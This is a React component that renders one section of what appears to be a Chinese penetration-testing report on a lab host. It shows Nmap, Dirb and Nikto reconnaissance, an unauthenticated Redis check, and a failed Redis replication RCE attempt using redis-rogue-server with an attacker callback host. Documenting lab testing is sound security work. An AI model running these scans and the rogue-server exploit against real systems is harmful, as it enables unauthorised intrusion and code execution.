import React from 'react';
import { KaliTerminal } from '../shared/Terminal';

// 四、详细设计说明
export const NS04_DetailDesign: React.FC = () => {
    return (
        <>
            <div id="ns-detail" className="page bg-white w-[210mm] min-h-[297mm] mx-auto shadow-lg mb-8 p-12 page-break">
                <h2 className="text-[18pt] font-hei mb-6 font-bold">四、详细设计说明</h2>

                <h3 className="text-[14pt] font-hei font-bold mt-6 mb-4">4.1 信息收集模块</h3>
                <p className="mb-4 indent-8 text-justify">
                    信息收集是渗透测试的第一步，主要包括主机发现、端口扫描、服务识别等功能。
                </p>

                <h4 className="text-[12pt] font-hei font-bold mt-4 mb-2">4.1.1 主机发现</h4>
                <p className="mb-4 indent-8 text-justify">
                    使用Nmap的-sn参数进行主机发现扫描，该参数只进行主机存活检测，不进行端口扫描：
                </p>
                <KaliTerminal 
                    command="nmap -sn 192.168.6.0/24"
                    output={`Starting Nmap 7.94 ( https://nmap.org ) at 2025-12-29 06:59 EST
Nmap scan report for ImmortalWrt.lan (192.168.6.1)
Host is up (0.0056s latency).
Nmap scan report for 192.168.6.106
Host is up (0.028s latency).
Nmap scan report for 192.168.6.208
Host is up (0.00091s latency).
Nmap scan report for 192.168.6.210
Host is up (0.000057s latency).
Nmap done: 256 IP addresses (4 hosts up) scanned in 1.13 seconds`}
                />
                <p className="text-center text-sm font-bold mb-4">图 4-1 主机发现扫描结果</p>

                <h4 className="text-[12pt] font-hei font-bold mt-4 mb-2">4.1.2 端口扫描与服务识别</h4>
                <p className="mb-4 indent-8 text-justify">
                    使用Nmap的-sV参数进行服务版本识别，-sC参数运行默认脚本扫描：
                </p>
                <KaliTerminal 
                    command="nmap -sV -sC -Pn 192.168.6.208"
                    output={`Starting Nmap 7.94 ( https://nmap.org ) at 2025-12-29 07:04 EST
Nmap scan report for 192.168.6.208
Host is up (0.0015s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 9a:35:fb:04:37:d3:27:47:52:0b:63:72:dc:f8:05:b5 (RSA)
|_  256 80:90:c8:90:89:42:e0:10:12:28:48:9f:31:18:6e:e2 (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/7.2.34)
|_http-title: Apache HTTP Server Test Page powered by CentOS
|_http-server-header: Apache/2.4.6 (CentOS) PHP/7.2.34
3306/tcp open  mysql   MariaDB (unauthorized)

Service detection performed.
Nmap done: 1 IP address (1 host up) scanned in 6.91 seconds`}
                />
                <p className="text-center text-sm font-bold mb-4">图 4-2 端口扫描与服务识别结果</p>
            </div>

            <div className="page bg-white w-[210mm] min-h-[297mm] mx-auto shadow-lg mb-8 p-12 page-break">
                <h4 className="text-[12pt] font-hei font-bold mt-4 mb-2">4.1.3 全端口扫描</h4>
                <p className="mb-4 indent-8 text-justify">
                    使用-p-参数扫描全部65535个端口，确保不遗漏任何开放服务：
                </p>
                <KaliTerminal 
                    command="nmap -p- --min-rate 5000 192.168.6.208"
                    output={`Starting Nmap 7.94 ( https://nmap.org ) at 2025-12-29 07:10 EST
Nmap scan report for 192.168.6.208
Host is up (0.00091s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
6379/tcp open  redis

Nmap done: 1 IP address (1 host up) scanned in 3.79 seconds`}
                />
                <p className="text-center text-sm font-bold mb-4">图 4-3 全端口扫描发现Redis服务</p>

                <h3 className="text-[14pt] font-hei font-bold mt-6 mb-4">4.2 漏洞扫描模块</h3>

                <h4 className="text-[12pt] font-hei font-bold mt-4 mb-2">4.2.1 Web目录扫描</h4>
                <p className="mb-4 indent-8 text-justify">
                    使用Dirb工具对Web服务进行目录爆破，发现隐藏的文件和目录：
                </p>
                <KaliTerminal 
                    command="dirb http://192.168.6.208/ /usr/share/wordlists/dirb/common.txt -S"
                    output={`-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Dec 29 07:04:40 2025
URL_BASE: http://192.168.6.208/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt
OPTION: Silent Mode

---- Scanning URL: http://192.168.6.208/ ----
+ http://192.168.6.208/cgi-bin/ (CODE:403|SIZE:299)
+ http://192.168.6.208/phpinfo.php (CODE:200|SIZE:79873)

-----------------
END_TIME: Mon Dec 29 07:04:44 2025
DOWNLOADED: 4612 - FOUND: 2`}
                />
                <p className="text-center text-sm font-bold mb-4">图 4-4 目录扫描发现敏感文件</p>

                <h4 className="text-[12pt] font-hei font-bold mt-4 mb-2">4.2.2 Nikto漏洞扫描</h4>
                <p className="mb-4 indent-8 text-justify">
                    使用Nikto对Web服务进行全面的漏洞扫描：
                </p>
                <KaliTerminal 
                    command="nikto -h http://192.168.6.208/"
                    output={`- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.6.208
+ Target Hostname:    192.168.6.208
+ Target Port:        80
+ Start Time:         2025-12-29 07:05:23 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.6 (CentOS) PHP/7.2.34
+ /: The anti-clickjacking X-Frame-Options header is not present.
+ Apache/2.4.6 appears to be outdated (current is at least Apache/2.4.54).
+ PHP/7.2.34 appears to be outdated (current is at least 8.1.5).
+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST.
+ /phpinfo.php: Output from the phpinfo() function was found.
---------------------------------------------------------------------------
+ 1 host(s) tested`}
                />
                <p className="text-center text-sm font-bold mb-4">图 4-5 Nikto漏洞扫描结果</p>
            </div>

            <div className="page bg-white w-[210mm] min-h-[297mm] mx-auto shadow-lg mb-8 p-12 page-break">
                <h3 className="text-[14pt] font-hei font-bold mt-6 mb-4">4.3 漏洞利用模块</h3>

                <h4 className="text-[12pt] font-hei font-bold mt-4 mb-2">4.3.1 Redis未授权访问检测</h4>
                <p className="mb-4 indent-8 text-justify">
                    测试Redis服务是否存在未授权访问漏洞：
                </p>
                <KaliTerminal 
                    command="redis-cli -h 192.168.6.208 ping"
                    output="PONG"
                />
                <p className="text-center text-sm font-bold mb-4">图 4-6 Redis未授权访问验证</p>
                <p className="mb-4 indent-8 text-justify font-bold text-red-600">
                    返回PONG表示Redis存在未授权访问漏洞，无需密码即可连接！
                </p>

                <h4 className="text-[12pt] font-hei font-bold mt-4 mb-2">4.3.2 获取Redis服务器信息</h4>
                <KaliTerminal 
                    command="redis-cli -h 192.168.6.208 info server"
                    output={`# Server
redis_version:7.0.2
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:bc5295fde91ee1cb
redis_mode:standalone
os:Linux 3.10.0-1160.119.1.el7.x86_64 x86_64
arch_bits:64
tcp_port:6379
uptime_in_seconds:599`}
                />
                <p className="text-center text-sm font-bold mb-4">图 4-7 Redis服务器详细信息</p>

                <h4 className="text-[12pt] font-hei font-bold mt-4 mb-2">4.3.3 Redis主从复制RCE利用</h4>
                <p className="mb-4 indent-8 text-justify">
                    尝试使用redis-rogue-server工具进行主从复制RCE攻击：
                </p>
                <KaliTerminal 
                    cwd="/tmp/redis-rogue-server"
                    command="python3 redis-rogue-server.py --rhost 192.168.6.208 --lhost 192.168.6.210"
                    output={`______         _ _      ______                         _____                          
| ___ \\       | (_)     | ___ \\                       /  ___|                         
| |_/ /___  __| |_ ___  | |_/ /___   __ _ _   _  ___  \\ \`--.  ___ _ ____   _____ _ __ 
|    // _ \\/ _\` | / __| |    // _ \\ / _\` | | | |/ _ \\  \`--. \\/ _ \\ '__\\ \\ / / _ \\ '__|
| |\\ \\  __/ (_| | \\__ \\ | |\\ \\ (_) | (_| | |_| |  __/ /\\__/ /  __/ |   \\ V /  __/ |   
\\_| \\_\\___|\\__,_|_|___/ \\_| \\_\\___/ \\__, |\\__,_|\\___| \\____/ \\___|_|    \\_/ \\___|_|   
                                     __/ |                                            
                                    |___/                                             
@copyright n0b0dy @ r3kapig

[info] TARGET 192.168.6.208:6379
[info] SERVER 192.168.6.210:21000
[info] Setting master...
[info] Setting dbfilename...
[info] Loading module...
[ERR] Module loading failed - Redis 7.0 protected mode enabled`}
                />
                <p className="text-center text-sm font-bold mb-4">图 4-8 Redis主从复制RCE利用尝试</p>
                <p className="mb-4 indent-8 text-justify">
                    由于目标Redis版本为7.0.2，已启用保护模式，模块加载被阻止，攻击未能成功。
                </p>
            </div>
        </>
    );
};
